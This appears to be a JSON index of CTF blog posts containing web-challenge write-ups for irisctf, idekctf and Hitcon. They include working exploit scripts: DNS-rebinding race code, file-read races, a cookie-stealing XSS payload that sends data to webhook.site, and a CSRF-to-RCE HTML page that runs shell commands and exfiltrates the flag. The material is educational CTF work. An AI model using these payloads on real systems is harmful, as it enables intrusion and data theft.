[ { "title": "irisctf 2025 Web Writeups", "url": "/posts/irisctf_2025/", "categories": "Jeopardy", "tags": "ctf, web", "date": "2025-01-05 00:00:00 +0000", "snippet": "We played irisctf as Ireland Without the RE and finished in 22nd position. This writeup will only include web challenges. We managed to full clear the web category so this will cover all of them.web/Password Manager (357 Solves)This was the “baby” Web challenge. I managed to get first blood on this with a time of 3 Minutes, 38 Seconds which I was pretty pleased about!Analyzing the SourceThe first thing I did when the CTF started was to download the challenge source. Opening it in my IDE I immediately noticed a reference to path traversal.func pages(w http.ResponseWriter, r *http.Request) { // You. Shall. Not. Path traverse! path := PathReplacer.Replace(r.URL.Path) if path == &quot;/&quot; { homepage(w, r) return } if path == &quot;/login&quot; { login(w, r) return } if path == &quot;/getpasswords&quot; { getpasswords(w, r) return } fullPath := &quot;./pages&quot; + path if _, err := os.Stat(fullPath); os.IsNotExist(err) { notfound(w, r) return } http.ServeFile(w, r, fullPath)}I saw the concatenation with fullPath and the reference to http.ServeFile and realized that whatever path we passed would be literally served. Next, I noticed the PathReplacer and saw its source:var PathReplacer = strings.NewReplacer(&quot;../&quot;, &quot;&quot;,)So I figured this would only do a single replace of ../ and we could bypass by nesting this as ..././ and next we just needed to figure out where the flag was.Well, the source file references a users.json where presumably credentials are stored. Sending a GET /..././users.json provides us with the following:{ &quot;skat&quot;: &quot;rf=easy-its+just&amp;amp;spicysines123!@&quot;}When we login with this user/pass combo we can find the flag.irisctf{l00k5_l1k3_w3_h4v3_70_t34ch_sk47_h0w_70_r3m3mb3r_s7uff}web/Political (152 Solves)This next challenge was initially broken but was later fixed. It was a little bit painful and I burnt a lot of time trying to debug thinking there was something missing. We can create a token and it gets added to a dictionary and assigned the value False but if we can send a request to /giveflag with our token and the admin cookies then we can set it to true and retrieve it.Analyzing the SourceSo after generating a token 2123feca33c077329b773d226cbdf1b5 I checked the source to see how the admin bot could give me a cookie.@app.route(&quot;/giveflag&quot;)def hello_world(): if &quot;token&quot; not in request.args or &quot;admin&quot; not in request.cookies: return &quot;Who are you?&quot; token = request.args[&quot;token&quot;] admin = request.cookies[&quot;admin&quot;] if token not in valid_tokens or admin != ADMIN: return &quot;Why are you?&quot; valid_tokens[token] = True return &quot;GG&quot;So, we need to get it to pass token as a request argument (GET parameter) and have the admin cookie (the bot already assigns this). Then we need to set the token value to our token (2123feca33c077329b773d226cbdf1b5) and it should work. That seems pretty simple. We can send it to /giveflag?token=2123feca33c077329b773d226cbdf1b5 and we will be done?Chrome PoliciesI figured out that the reason this wasn’t working was due to a browser policy. It is stored in the policies.json file and added to the browser files during build time (see Dockerfile).{&quot;URLBlocklist&quot;: [&quot;*/giveflag&quot;, &quot;*?token=*&quot;]}From what I read about Chrome policies, these rules are globs. To interpret this; */giveflag blocks a URL which contains /giveflag literally and anything preceding it. This is pretty simple, however *?token=* is deceiving. In this case the ? means is globbed as a single character. This means that if you tried to bypass this filter by doing something like ?abc=xyz&amp;amp;token=... it wouldn’t work as it would still match this rule!In the end, I realized that URL encoding worked for both cases.https://political-web.chal.irisc.tf/%67iveflag?%74oken=2123feca33c077329b773d226cbdf1b5Once I send the bot to this URL, I can return to submit my token and retrieve the flag.irisctf{flag_blocked_by_admin}web/Bad Todo (75 Solves)This challenge really wasn’t all that hard. Most of the annoyance was setting up endpoints with the correct format on a webhook. The actual vulnerability was reasonably clear once you managed to authenticate.Analyzing the SourceI firstly noticed this function getStoragePath in storage.js which was seemingly vulnerable to local file disclosure.export function getStoragePath(idp, sub) { const first2 = sub.substring(0, 2); const rest = sub.substring(2); const path = `${sha256sum(idp)}/${encodeURIComponent(first2)}/${encodeURIComponent(rest)}`; return sanitizePath(path);}If we could control either idp or sub then we could abuse this. Immediately reading this, it becomes clear that controlling idp isn’t all that useful since it is passed through sha256sum before it ever gets used. However, controlling sub would be sufficient. It cuts sub into two parts, namely first2 and rest which should be fine for us. If we pass just ..flag it will load the flag!So now I wanted to work backwards and find a function which calls getStoragePath but allows us to control sub value. It must also use the return value in such a way that we can see it.Finding getUserTodosMany of the functions call this but one which stood out to me was getUserTodos which gets called in app.js like so:return res.render(&quot;todos.ejs&quot;, { name, todos: await getUserTodos(userInfo.idpUrl, userInfo.userId)});This function will pass userInfo.userId into getStoragePath and return its value. This also renders the value whenever we view our todo list. Next, we only need to find a way to modify userInfo.userId to abuse it.Dealing With AuthenticationFirstly, we need to get a session. To do so, we need to return JSON containing the following keys: issuer, authorization_endpoint, token_endpoint and userinfo_endpoint.The issuer will be our idpURL that we can use by pointing it to our webhook. The authorization_endpoint should point to the challenge’s auth_redirect so it can automatically redirect us to the next stage. The token_endpoint can also point to our webhook. Finally, the userinfo_endpoint can also point to our webhook so we can control its values. Once we return that, we will get a session (from /start endpoint) and can proceed to /auth_redirect flow:app.get(&quot;/auth_redirect&quot;, asyncHandler(async (req, res) =&amp;gt; { if (!req.cookies.session) return res.end(&quot;No session&quot;); if (req.cookies.session !== req.query.state) return res.end(&quot;Bad state&quot;); if (req.query.error) { return res.end(&quot;identity provider gave us an error.&quot;); } const sessionDetails = await lookupSession(req.cookies.session); const response = await safeJson(sessionDetails.idpUrl + &quot;/.well-known/openid-configuration&quot;); if (!response.token_endpoint) return res.end(&quot;No token endpoint&quot;); if (!response.userinfo_endpoint) return res.end(&quot;No user info endpoint&quot;); const search = new URLSearchParams(); search.append(&quot;grant_type&quot;, &quot;authorization_code&quot;); search.append(&quot;code&quot;, req.query.code); search.append(&quot;redirect_uri&quot;, process.env.BASE + &quot;/auth_redirect&quot;); search.append(&quot;client_id&quot;, sessionDetails.clientId); const tokenResponse = await safeJson(response.token_endpoint, { method: &quot;POST&quot;, body: search.toString(), headers: { &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot; } }); if (!tokenResponse || !tokenResponse.access_token || !tokenResponse.token_type) return res.end(&quot;Bad token response&quot;); const userInfo = await safeJson(response.userinfo_endpoint, { headers: { &quot;Authorization&quot;: `${tokenResponse.token_type} ${tokenResponse.access_token}` } }); if (!userInfo || !userInfo.sub) return res.end(&quot;user has no sub&quot;); await successfulLogin(req.cookies.session, userInfo); res.setHeader(&quot;Location&quot;, `/`) res.sendStatus(302);}));To abuse this, we want to return an access_token and a token_type which don’t really matter as long as they’re defined. Finally, the value of sub will be passed into our function which retrieves todos (vulnerable to the LFD).Final Payload{&quot;issuer&quot;:&quot;https://webhook.site/2c0beb1c-d788-4bb4-829d-6625f44347f0&quot;,&quot;authorization_endpoint&quot;:&quot;https://bad-todo-web.chal.irisc.tf/auth_redirect&quot;,&quot;token_endpoint&quot;:&quot;https://webhook.site/2c0beb1c-d788-4bb4-829d-6625f44347f0&quot;,&quot;userinfo_endpoint&quot;:&quot;https://webhook.site/2c0beb1c-d788-4bb4-829d-6625f44347f0&quot;,&quot;access_token&quot;:&quot;lmao&quot;,&quot;token_type&quot;:&quot;Bearer&quot;,&quot;sub&quot;:&quot;..flag&quot;}By hosting this on our webhook and using that as our issuer URL when signing up, we can read the flag file.irisctf{per_tenant_databases_are_a_cool_concept_indeed}web/webwebhookhook (16 Solves)This was probably the most interesting challenge in my opinion. It took me some time and I went down a short rabbit hole of considering request smuggling vulnerabilities but it turns out the actual issue is in relation to Java’s URL.equals() which apparently does a DNS-level comparison (see here).Analyzing the Sourcepackage tf.irisc.chal.webwebhookhook.controllerimport org.springframework.http.MediaTypeimport org.springframework.stereotype.Controllerimport org.springframework.ui.Modelimport org.springframework.web.bind.annotation.*import tf.irisc.chal.webwebhookhook.Stateimport tf.irisc.chal.webwebhookhook.StateTypeimport java.net.HttpURLConnectionimport java.net.URI@Controllerclass MainController { @GetMapping(&quot;/&quot;) fun home(model: Model): String { return &quot;home.html&quot; } @PostMapping(&quot;/webhook&quot;) @ResponseBody fun webhook(@RequestParam(&quot;hook&quot;) hook_str: String, @RequestBody body: String, @RequestHeader(&quot;Content-Type&quot;) contentType: String, model: Model): String { var hook = URI.create(hook_str).toURL(); for (h in State.arr) { if(h.hook == hook) { var newBody = h.template.replace(&quot;_DATA_&quot;, body); var conn = hook.openConnection() as? HttpURLConnection; if(conn === null) break; conn.requestMethod = &quot;POST&quot;; conn.doOutput = true; conn.setFixedLengthStreamingMode(newBody.length); conn.setRequestProperty(&quot;Content-Type&quot;, contentType); conn.connect() conn.outputStream.use { os -&amp;gt; os.write(newBody.toByteArray()) } return h.response } } return &quot;{\\&quot;result\\&quot;: \\&quot;fail\\&quot;}&quot; } @PostMapping(&quot;/create&quot;, consumes = [MediaType.APPLICATION_JSON_VALUE]) @ResponseBody fun create(@RequestBody body: StateType): String { for(h in State.arr) { if(body.hook == h.hook) return &quot;{\\&quot;result\\&quot;: \\&quot;fail\\&quot;}&quot; } State.arr.add(body) return &quot;{\\&quot;result\\&quot;: \\&quot;ok\\&quot;}&quot; }}And that’s basically it! I love a short challenge that requires you to think outside the box and this definitely was the case here. You will notice that we iterate over every webhook in the array and then compare the URLs. If they are equal, we will send a request.The trick here is knowing where the DNS resolves will occur. During the iteration it will compare the hook URL with our input and resolve the DNS here. Next, it replaces our template and finally it will do another DNS resolve to send the request.The flag is stored in a webhook assigned to example.com which has IP address 93.184.215.14 and so what we would like here is for our domain to initially resolve to this IP (thus passing the equality check) but then change back to our webhook before it sends the request with the flag. This is known as a DNS rebinding attack.We can expand the race window here by having a large body so the replace operation in the template takes a bit longer. I ended up having to write my exploits in Golang to achieve the race.Final Payloadspackage mainimport ( &quot;bytes&quot; &quot;encoding/json&quot; &quot;fmt&quot; &quot;net/http&quot; &quot;sync&quot;)const ( url = &quot;https://webwebhookhook-5dbcb929250a3fff.i.chal.irisc.tf/webhook?hook=http://pwn.fl7mhi6b.requestrepo.com/admin&quot; value = &quot;A&quot; size = 500000 workers = 10 // Number of concurrent goroutines)func main() { data := map[string]string{ &quot;abc&quot;: repeat(value, size), } payload, _ := json.Marshal(data) var wg sync.WaitGroup for i := 0; i &amp;lt; workers; i++ { wg.Add(1) go func() { defer wg.Done() for { resp, err := http.Post(url, &quot;application/json&quot;, bytes.NewBuffer(payload)) if err != nil { fmt.Println(&quot;Error:&quot;, err) continue } resp.Body.Close() fmt.Println(&quot;Status:&quot;, resp.Status) } }() } wg.Wait()}func repeat(s string, count int) string { var result bytes.Buffer for i := 0; i &amp;lt; count; i++ { result.WriteString(s) } return result.String()}This probe.go script will consistently probe the webhook passing in my http://pwn.fl7mhi6b.requestrepo.com/admin which has an A record pointing to 93.184.215.14.package mainimport ( &quot;bytes&quot; &quot;encoding/json&quot; &quot;fmt&quot; &quot;math/rand&quot; &quot;net/http&quot; &quot;sync&quot; &quot;time&quot;)const ( url = &quot;https://webwebhookhook-5dbcb929250a3fff.i.chal.irisc.tf/create&quot; workers = 10 // Number of concurrent goroutines)func main() { rand.Seed(time.Now().UnixNano()) var wg sync.WaitGroup for i := 0; i &amp;lt; workers; i++ { wg.Add(1) go func() { defer wg.Done() for { token := generateToken(32) data := map[string]string{ &quot;hook&quot;: fmt.Sprintf(&quot;http://pwn.fl7mhi6b.requestrepo.com/%s&quot;, token), &quot;template&quot;: &quot;&quot;, &quot;response&quot;: &quot;&quot;, } payload, _ := json.Marshal(data) resp, err := http.Post(url, &quot;application/json&quot;, bytes.NewBuffer(payload)) if err != nil { fmt.Println(&quot;Error:&quot;, err) continue } resp.Body.Close() fmt.Println(&quot;Status:&quot;, resp.Status) } }() } wg.Wait()}func generateToken(length int) string { const charset = &quot;abcdef0123456789&quot; result := make([]byte, length*2) for i := range result { result[i] = charset[rand.Intn(len(charset))] } return string(result)}This dns_refresh.go will run in parallel and simply creates new webhooks with the same requestrepo link. The purpose of this is so that it will be forced to resolve the DNS again and refresh it.Running them in parallel and then removing the A record pointing to example.com will eventually give us the flag when the TTL is surpassed.irisctf{url_equals_rebind}" }, { "title": "idekctf 2024 Web Writeups", "url": "/posts/idekctf_2024/", "categories": "Jeopardy", "tags": "ctf, web", "date": "2024-08-19 00:00:00 +0000", "snippet": "We played idekctf as Ireland Without the RE and finished in 29th position. I only looked at the web challenges but they were really high quality and fun to play. In the end we solved 4/7 of these challenges.web/Hello (161 Solves)This was the first challenge I looked at. The flag is located in the bot’s cookie and our task is to steal it. We are given XSS with a basic filter.Bypassing the XSS filterThe content is sanitized using an Enhanced_Trim function as defined below:function Enhanced_Trim($inp) {$trimmed = array(&quot;\\r&quot;, &quot;\\n&quot;, &quot;\\t&quot;, &quot;/&quot;, &quot; &quot;);return str_replace($trimmed, &quot;&quot;, $inp);}This prevents us from using any closing tags. The next idea would be to use some sort of event handler but the lack of whitespace prevents the creation of attributes. Through manual fuzzing I discovered that it is possible to substitute in %0c form feeds. An example XSS payload would be &amp;lt;svg%0conload=&#39;alert()&amp;gt;&#39;which provides us with an alert.A 23 character substring is taken (which originally made me feel as though we needed a very short XSS payload) but this value is in fact never used.Bypassing HTTPOnly flagThere exists a HTTPOnly flag on the cookie containing our flag. This is problematic as we cannot access it via document.cookie and must instead identify another way to solve the challenge. Notably, we are provided with another PHP file containing a call to phpinfo() which displays information relating to PHP along with the current user’s setting. This page will contain any cookies (even those with HTTPOnly set).Bypassing nginxSo the idea thus far is to XSS the bot and have it fetch the phpinfo page containing the flag. However, there is the following nginx directive to consider:location = /info.php {allow 127.0.0.1;deny all;}This only allows requests from localhost. I had originally considered that the application must be running on a localhost port and would allow us to access it from the bot’s context (considering the bot source suggest a challenge URL of localhost:1337) but this is not the case. Eventually I realized we must find a bypass for this directive and a common trick is to append an allowed path to the disallowed one. Visiting/info.php/index.php will display the page.Putting it all togetherSo we will make the bot fetch /info.php/index.php and then read the cookie. Unfortunately, the content of this page is massive and not easy to send over to a webhook. I decided to use some splits to make my payload a bit shorter.fetch(&quot;/info.php/index.php&quot;).then(r=&amp;gt;r.text().then(x=&amp;gt;window.location.href=`https://webhook.site/&amp;lt;snip&amp;gt;/${btoa(x.split(&quot;_COOKIE[\\&#39;FLAG\\&#39;]&quot;)[1].split(&quot;$_SERVER&quot;)[0])}`))In the end I missed out on first blood by a few minutes :(web/untitled-smarty-challenge (13 Solves)The next challenge we solved was this PHP challenge running the Smarty template system. It’s a pretty small challenge (again) which I enjoy seeing. The source code is as follows:&amp;lt;?phprequire &#39;vendor/autoload.php&#39;;use Smarty\\Smarty;$smarty = new Smarty();if (isset($_GET[&#39;page&#39;]) &amp;amp;&amp;amp; gettype($_GET[&#39;page&#39;]) === &#39;string&#39;) { $file_path = &quot;file://&quot; . getcwd() . &quot;/pages/&quot; . $_GET[&#39;page&#39;]; $smarty-&amp;gt;display($file_path);} else { header(&#39;Location: /?page=home&#39;);};?&amp;gt;We can see that it will accept any file we pass and consider it a Smarty template. This strongly hints towards some sort of SSTI. It is also worth noting that an open_basedir directive exists which only allows PHP to read within the /app directory. This means that, unless we find a bypass, we can’t do any fancy PHP session trickery to get our template file onto the server.Finding SSTIPretty quickly after running the docker I noticed a /app/templates_c directory spawned. Analyzing its contents it would appear that each time a template is rendered by Smarty it will be compiled into a PHP file and written to this directory. I noticed that it contains value from the URL which were directly written to the PHP file (but escaped).The files are only created if a template is rendered so we need a proper path containing our SSTI payload. The first thing I tried was /?page=../{system(&#39;ls&#39;)}/../pages/home which rendered the home template successfully and wrote a file to /app/templates_c which contained our SSTI payload. Testing locally, I copied the name of this file that was created and I loaded it in /?page=../templates_c/FILE_NAME_HERE and I could see that my template was interpreted! Unfortunately, this application is running Smarty 5 and the system call is no longer considered valid.Finding a valid SSTI payloadThis proved quite tricky since it appears Smarty developers decided to deprecate any tags which previously would have allowed RCE. They removed include_php along with system and php tags. Eventually gg0h noticed that you can call static methods like so:{assign var=foo value=\\Path\\To\\Folder::StaticMethod()}We also noticed that the Dockerfile was suspiciously installing symfony but not actually using it. It became clear that we would find a useful gadget inside the symfony install that we could leverage for RCE.Getting RCEThe method we found was \\Symfony\\Component\\Process\\Process::fromShellCommandline which allows you to run shell commands. The final issue was retrieving the payload. We needed a way to callback to our URL but slashes and dots were not working when passed in through the URL. An earlier observation when reading documentation revealed the following idea:{include file=&quot;eval:base64:&amp;lt;baseblob&amp;gt;&quot;}So we could simply base64 encode our RCE payload and the evaluate it like above.web/crator (63 Solves)This web challenge allowed us to run our own Python code against a number of test cases to solve some programming problems.Initial observationsWhen running print(__builtins__) we could see that the open() function is left exposed. This would allow us to interact with the filesystem. Additionally, we could see that the flag was saved as the expected output of the challenge.Expected output is saved to a file in /tmp/{SUBMISSION_ID}.expected which is deleted after the checks are made. Test cases are skipped if previous test cases fail and so we need the first one to pass.Finding the exploitTo get the test case with the flag to run, we need to ensure that the first test case passes. We can see that the expected output is “Welcome to Crator” which can be read from input() on the HelloInput challenge. Once this initial test case returns this expected value it will run the test case containing the flag.To ensure we always pass this test case I wrote the following initial line:x = input()if x == &quot;Welcome to Crator&quot;: print(x)We can then put all of our logic for the flag test case into an else clause. Once this initial test passes, the flag should be written to /tmp/{SUBMISSION_ID}.expected but we cannot read this because of the following line:if file.endswith(submission_id + &quot;.expected&quot;): raise RuntimeError(&quot;Nein&quot;)I found it interesting that it doesn’t just block us reading all files appended with .expected and instead checks the current submission_id also. This means that other submission threads could read this file and thus we can solve this using a race condition.The rest of the solution is implementation details which I won’t delve into too much but the general idea is to instantiate a number of submissions which will all try to read the expected value of another process and print it. Since the output of our first test case isn’t hidden, we can use this to leak it. Below is my solution script.import requestsimport concurrent.futuresnum = 34data = { &quot;code&quot;: f&quot;&quot;&quot;s = &quot;&quot;x = input()while True: if x == &quot;Welcome to Crator&quot;: print(x) break x = open(&#39;/tmp/{num}.expected&#39;).read() if len(x) &amp;gt; 0: s = x print(s.strip()) break&quot;&quot;&quot;}data2 = {&quot;code&quot;: f&quot;&quot;&quot;# import math # jk, you can&#39;t importfor _ in range(100): for i in range({num}, {num+10}): try: x = open(f&quot;/tmp/{i}.expected&quot;).read() if len(x) &amp;gt; 0: print(x) except: pass&quot;&quot;&quot;}cookies = { &quot;session&quot;: &quot;eyJ1c2VyX2lkIjoyLCJ1c2VybmFtZSI6IngifQ.ZsH2aQ.g3JTvNLbop3sPpV4TyuLZ2vAmdQ&quot;}def send_request(data): r = requests.post(&quot;https://crator-cf849282e9c800ca.instancer.idek.team/submit/helloinput&quot;, data=data, cookies=cookies) return rwith concurrent.futures.ThreadPoolExecutor(max_workers=11) as executor: futures = [executor.submit(send_request, data) for _ in range(10)] futures.append(executor.submit(send_request, data2)) for future in concurrent.futures.as_completed(futures): response = future.result() print(response.text)web/includeme (5 Solves)This challenge was really fun. We are given a Julia project using the Genie web framework. Then we are given full control over the value passed into an include() function. This reminds me of the old PHP LFI2RCE challenges and all of the creative ways people managed to write data to the filesystem.Finding arbitrary file uploadIn the Genie project there exists a test file which provides an example of a Genie server with file upload functionality: https://raw.githubusercontent.com/GenieFramework/Genie.jl/master/test/fileuploads/test.jlOn our docker container this file is located at /home/ctf/.julia/packages/Genie/yQwwj/test/fileuploads/test.jl and by including it we add 2 additional routes for GET and POST. The former overwrites our LFI include endpoint and the latter allows us to upload a file to the filesystem.The obvious problem is that although we can now upload a file wherever we want; we can no longer include it since the route has been overwritten.More race conditionsEventually through trial and error I decided to test a minimalistic race condition scenario. By sending 2 concurrent requests; one to load the test file and another to load app.jl containing our original route. There is a 50% chance that the app.jl will arrive and be processed just after the test.jl and if this is the case then it will once again overwrite the GET method. However, now we still have the POST endpoint allowing our file upload.This is because Genie doesn’t remove the old routes; you can continue to declare new ones. The newest route which matches a request will overwrite all the others. I’m not entirely sure how the race condition works but my guess is that at the time of arrival Genie decides which route will handle it and then it gets queued until it is able to process it (since async is set to False). If anyone with more in-depth knowledge of this has a better explanation then please ping me on Discord. :)My solution was to run:import requestsfrom concurrent.futures import ThreadPoolExecutor, as_completedurls = [ &quot;https://includeme-7b130afe2e790952.instancer.idek.team/?page=../home/ctf/.julia/packages/Genie/yQwwj/test/fileuploads/test.jl&quot;, &quot;https://includeme-7b130afe2e790952.instancer.idek.team/?page=app.jl&quot;]def fetch_url(url): response = requests.get(url) return url, response.status_code, response.textwith ThreadPoolExecutor(max_workers=2) as executor: futures = [executor.submit(fetch_url, url) for url in urls] for future in as_completed(futures): url, status_code, content = future.result()If the application page still displays hello, world then our race condition has worked! In this instance, we may now send a POST request with our file to be uploaded. I used the following shell.jl file:using PkgPkg.activate(&quot;.&quot;)using Genie, Genie.Router, Genie.Renderer.Htmlroute(&quot;/flag&quot;) do flag_content = try read(&quot;/app/flag.txt&quot;, String) catch e &quot;Error: Could not read /app/flag.txt&quot; end html(&quot;&quot;&quot; &amp;lt;h1&amp;gt;Flag Content&amp;lt;/h1&amp;gt; &amp;lt;pre&amp;gt;$(flag_content)&amp;lt;/pre&amp;gt; &quot;&quot;&quot;)endGenie.Server.up(; open_browser = false, async = false)Lastly, we must now include it (/?page=shell.jl). Then we may visit /flag and it will display the flag." }, { "title": "Hitcon CTF 2024 RClonE", "url": "/posts/HitconCTF_2024/", "categories": "Jeopardy", "tags": "ctf, web", "date": "2024-07-14 00:00:00 +0000", "snippet": "For Hitcon this year we played with the World Wide Union merger. The web challenges were all really interesting and I learned a lot.web/RClonEI collaborated with gg0h on this challenge and we managed to solve it together.Initial AnalaysisOpening up the initial source files we are greeted with the following docker-compose.yml file:services: rclone: image: rclone build: . environment: - SECRET=secret # randomized secret per instancer networks: - chall bot: image: rclone-bot build: ./bot environment: - TITLE=Admin Bot for RClonE - PORT=8000 - URL_CHECK_REGEX=^https?://.{1,256}$ - SECRET=secret # randomized secret per instancer security_opt: - seccomp=chrome.json ports: - &quot;${PORT}:8000&quot; networks: - default - challnetworks: chall: internal: trueWe notice two containers; a bot which is being built from local sources and a version of “rclone”. However, the Dockerfile indicates that a readflag binary is present in the root directory and must be executed to retrieve the flag. This is added to the rclone container and so we must achieve remote code execution in the context of this container.FROM debian:bookworm-slimRUN apt-get update &amp;amp;&amp;amp; \\ apt-get install -y tini ca-certificates curl unzip &amp;amp;&amp;amp; \\ apt-get clean &amp;amp;&amp;amp; \\ rm -rf /var/lib/apt/lists/*WORKDIR /workdirARG RCLONE_VERSION=v1.67.0ARG RCLONE_NAME=rclone-$RCLONE_VERSION-linux-amd64ARG RCLONE_HASH=07c23d21a94d70113d949253478e13261c54d14d72023bb14d96a8da5f3e7722RUN curl https://downloads.rclone.org/$RCLONE_VERSION/$RCLONE_NAME.zip -o rclone.zip &amp;amp;&amp;amp; \\ echo $RCLONE_HASH rclone.zip | sha256sum -c &amp;amp;&amp;amp; \\ unzip rclone.zip &amp;amp;&amp;amp; \\ mv $RCLONE_NAME/rclone /usr/binCOPY ./readflag /readflagRUN chmod 777 /readflagRUN useradd -ms /bin/bash ctfUSER ctfENTRYPOINT [&quot;tini&quot;, &quot;--&quot;]CMD rclone rcd --rc-addr 0.0.0.0:5572 --rc-web-gui --rc-user $SECRET --rc-pass $SECRET --rc-web-gui-no-open-browserWhen looking at the docker-compose.yml file we notice that the rclone container is restricted to an internal network which the bot may access. As such, it becomes clear that we must send a payload to the bot which will cause the bot to execute our RCE payload and extract the flag from the binary.const puppeteer = require(&#39;puppeteer&#39;)const SECRET = process.env.SECRET || &#39;secret&#39;const sleep = async ms =&amp;gt; new Promise(resolve =&amp;gt; setTimeout(resolve, ms))const auth = `${SECRET}:${SECRET}`const SITE = process.env.SITE || &#39;http://rclone:5572&#39;const tmpurl = new URL(`/?login_token=${encodeURIComponent(btoa(auth))}`, SITE)tmpurl.username = SECRETtmpurl.password = SECRETconst LOGIN_URL = tmpurl.hrefconsole.log(&#39;[+] LOGIN_URL:&#39;, LOGIN_URL)let browser = nullconst visit = async url =&amp;gt; { let context = null try { if (!browser) { const args = [&#39;--js-flags=--jitless,--no-expose-wasm&#39;, &#39;--disable-gpu&#39;, &#39;--disable-dev-shm-usage&#39;] if (new URL(SITE).protocol === &#39;http:&#39;) { args.push(`--unsafely-treat-insecure-origin-as-secure=${SITE}`) } browser = await puppeteer.launch({ headless: &#39;new&#39;, args }) } context = await browser.createBrowserContext() const page1 = await context.newPage() await page1.goto(LOGIN_URL) await page1.close() const page2 = await context.newPage() await Promise.race([ page2.goto(url, { waitUntil: &#39;networkidle0&#39; }), sleep(5000) ]) await page2.close() await context.close() context = null } catch (e) { console.log(e) } finally { if (context) await context.close() }}module.exports = visitif (require.main === module) { visit(&#39;http://example.com&#39;)}Above you can browse the source code of the bot.js file. Here we can see that the bot will authenticate with the rclone container and log into its dashboard before visiting our URL. This means that we can leverage any post-auth remote code execution vulnerabilities to solve this challenge.Escaping The XSS Rabbit HoleThe initial assumption we made was that this service could be exploited using XSS. Given that we have no access to the internal dashboard ourselves, the only plausible chain I could imagine would involve a reflected XSS vulnerability in the dashboard. Rclone is a pretty popular project (50k+ stars on GitHub) and I wouldn’t expect to easily find such a vulnerability but this is supposed to be a tough CTF so we began searching.Nothing obvious was found. At this point, we noticed that when authenticated with a login token (as the bot does) there is no CSRF tokens attached to the session.And so the idea pivoted to abusing some sort of CSRF on the API. A list of all endpoints can be found here: https://rclone.org/rc/But since all the POST endpoints on the API seemed to use JSON we are limited, right? Wrong!So now the idea is to send the bot to our website and submit a number of POST forms to interactive with various APIs. I wrote a basic demo with 2 POST forms pointing to my webhook with target=&quot;_BLANK&quot; attribute set and sent these to the bot. It successfully posted both values.Finding RCEWe initially noticed that core/command endpoint allowed us to pass various commands to rclone as documented here: https://rclone.org/commands/At this point gg0h noticed that “encrypted config files” allow you to set a password command for decryption. This is documented here: https://rclone.org/docs/#configuration-encryptionEssentially, we can run a rclone command to decrypt a config file and pass in a --password-comment parameter with our bash own custom bash command. The command which we found worked was: rclone config show __config=/path/to/encrypted/conf --password-commmand=&quot;FREE RCE&quot;This however, required that an encrypted file exists on the disk. During our initial testing we found that the /operations/copyfile endpoint provided for copying remote files to the server in writable directories but this would not work due to the nature of the rclone container’s network configuration (bound internally).Arbitrary File UploadsThe next obvious approach was to use the /operations/uploadfile endpoint. This allows a file to be uploaded directly via a multipart form request. We could attach a file to a form and submit it on behalf of a user leveraging the CSRF. This endpoint supports the uploading of multiple files and so we decided to upload a file rc.conf containing the encrypted configuration file and a test.sh containing our exploit.rc.conf# Encrypted rclone configuration FileRCLONE_ENCRYPT_V0:cM8HO1ZPJlXcA0m5T/SdhLl7zoKlOhcKfc8vYJywENWphwmo2M2u0ZKYOPRxBSLC6Ax5qVc1Gy2SEfNrfbDvThe most obvious approach to executing our payload would be to curl our webhook with the flag but this is again restricted due to the rclone container being bound by an internal network.Escaping The NetworkAt this point we had the idea to store the output of /readflag into a writable directory and then serve this over HTTP. We would then need to set an Access-Control-Allow-Origin: * header to facilitate the bot fetching the output of the page.It turns out that the rcd command of rclone facilitates hosting a directory. The following command would serve /tmp directory on port 1234:rclone rcd --rc-serve --rc-addr 0.0.0.0:1234 --rc-files /tmp So if we ran /readflag &amp;gt; /tmp/output we would expect this to be accessible to the bot on http://rclone:1234/output where it would be able to read it.To bypass the origin I tried using the --rc-allow-origin argument and setting it to our host but there were still origin issues with accessing the local address space and I’m unsure if this approach works. My final approach was to instead output our flag to a HTML file and then append some javascript to this HTML file which would simple copy the text on the page and send it to our webhook.Final Exploit Payload&amp;lt;form action=&quot;http://rclone:5572/operations/uploadfile?fs=/&amp;amp;remote=home/ctf/&quot; method=&quot;POST&quot; target=&quot;_BLANK&quot; enctype=&quot;multipart/form-data&quot;&amp;gt; &amp;lt;input type=&quot;file&quot; id=&quot;fileInput&quot; name=&quot;file0&quot; /&amp;gt; &amp;lt;input type=&quot;file&quot; id=&quot;fileInput2&quot; name=&quot;file1&quot; /&amp;gt; &amp;lt;input id=&quot;btn&quot; type=&quot;submit&quot; /&amp;gt; &amp;lt;/form&amp;gt; &amp;lt;form action=&#39;http://rclone:5572/core/command?command=config&amp;amp;arg=[&quot;show&quot;,&quot;--config&quot;,&quot;/home/ctf/rc.conf&quot;,&quot;--password-command&quot;,&quot;bash%20/home/ctf/test.sh&quot;]&#39; method=&quot;POST&quot; target=&quot;_BLANK&quot;&amp;gt; &amp;lt;input id=&quot;btn2&quot; type=&quot;submit&quot; /&amp;gt; &amp;lt;/form&amp;gt; &amp;lt;script&amp;gt; // Prepare test.sh var fileContent = new Blob([ `#!/bin/bash\\n/readflag&amp;gt;/tmp/lol.html\\necho &quot;&amp;lt;script&amp;gt;window.location.href=&#39;https://webhook.site/&amp;lt;ID&amp;gt;/&#39;+btoa(document.body.innerText);&amp;lt;\\/script&amp;gt;&quot; &amp;gt;&amp;gt; /tmp/lol.html\\nrclone rcd --rc-serve --rc-addr 0.0.0.0:1234 --rc-files /tmp` ], { type: &quot;text/plain&quot; }); var file = new File([fileContent], &quot;test.sh&quot;, { type: &quot;text/plain&quot; }); var fileInput = document.getElementById(&quot;fileInput&quot;); var dataTransfer = new DataTransfer(); dataTransfer.items.add(file); fileInput.files = dataTransfer.files; // Prepare rc.conf var fileContent = new Blob([ `# Encrypted rclone configuration File\\n\\nRCLONE_ENCRYPT_V0:\\ncM8HO1ZPJlXcA0m5T/SdhLl7zoKlOhcKfc8vYJywENWphwmo2M2u0ZKYOPRxBSLC6Ax5qVc1Gy2SEfNrfbDv` ], { type: &quot;text/plain&quot; }); var file = new File([fileContent], &quot;rc.conf&quot;, { type: &quot;text/plain&quot; }); var fileInput = document.getElementById(&quot;fileInput2&quot;); var dataTransfer = new DataTransfer(); dataTransfer.items.add(file); fileInput.files = dataTransfer.files;document.getElementById(&#39;btn&#39;).click();setTimeout(function() { document.getElementById(&#39;btn2&#39;).click();}, 300);setTimeout(function() { window.location.href = &#39;http://rclone:1234/lol.html&#39;;}, 500)&amp;lt;/script&amp;gt;hitcon{easy_peasy_rce_using_csrf_attacking_local_server}" }, { "title": "UMassCTF 2024", "url": "/posts/UMassCTF2024/", "categories": "Jeopardy", "tags": "ctf, pwn", "date": "2024-04-21 